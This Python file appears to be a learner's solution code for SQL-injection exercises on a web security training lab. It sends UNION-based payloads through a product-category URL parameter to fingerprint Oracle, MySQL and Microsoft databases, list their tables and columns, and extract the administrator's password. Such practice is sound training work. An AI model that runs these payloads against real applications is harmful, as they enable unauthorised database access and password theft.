import requests
import urllib.parse

# This code block displays the version for an oracle database
# with requests.Session() as s:
#     # YOU MUST REMEMBER TO SPECIFY A TABLE TO QUERY FROM IN ORACLE
#     commandString = "Accessories' UNION SELECT banner, 'space' FROM v$version--"
#     url = f'https://0aa3001304414af0c0e3551c00380033.web-security-academy.net/filter?category={urllib.parse.quote(commandString)}'
#     session = s.get(url)
#     print(session.text)

#This code block queries the version from a MySql/Microsoft database
# with requests.Session() as s:
#     #Note the space after the comment for MySql and Microsoft databases
#     commandString = "Gifts' UNION SELECT NULL, @@version-- "
#     url = f'https://0a5400de03223bc2c06a6cfc005100b4.web-security-academy.net/filter?category={urllib.parse.quote(commandString)}'
#     session = s.get(url)
#     print(session.text)

#Listing the database schema on non oracle based databases
# with requests.Session() as s:
    #This one is post gres.
    # Command below gets all of the table names 
    # commandString = "Accessories' UNION SELECT NULL, table_name FROM information_schema.tables--"
    # users database is users_khbmhl
    # The command below dumps the column names from the specified table
    # commandString = "Accessories' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users_khbmhl'--"
    # Username column is "username_wjvuck" and password column is "password_mycsac"
    #The command below grabs the password based on the username
    # commandString = "Accessories' UNION SELECT NULL,password_mycsac from users_khbmhl where username_wjvuck = 'administrator'--"
    # url = f'https://0ab2004303834fa4c0992dfe005e00ec.web-security-academy.net/filter?category={urllib.parse.quote(commandString)}'
    # session = s.get(url)
    # print(session.text)


#Listing the database schema on oracle based databases
with requests.Session() as s:
    #This one is post gres.
    # Command below gets all of the table names 
    #commandString = "Accessories' UNION SELECT NULL, table_name FROM all_tables--"
    # users database is USERS_QILZCV
    # The command below dumps the column names from the specified table
    # commandString = "Accessories' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name = 'USERS_QILZCV'--"
    # Username column is "USERNAME_CTJTBJ" and password column is "PASSWORD_XPXYWO"
    #The command below grabs the password based on the username
    commandString = "Accessories' UNION SELECT NULL,PASSWORD_XPXYWO from USERS_QILZCV where USERNAME_CTJTBJ = 'administrator'--"
    url = f'https://0ab2004303834fa4c0992dfe005e00ec.web-security-academy.net/filter?category={urllib.parse.quote(commandString)}'
    session = s.get(url)
    print(session.text)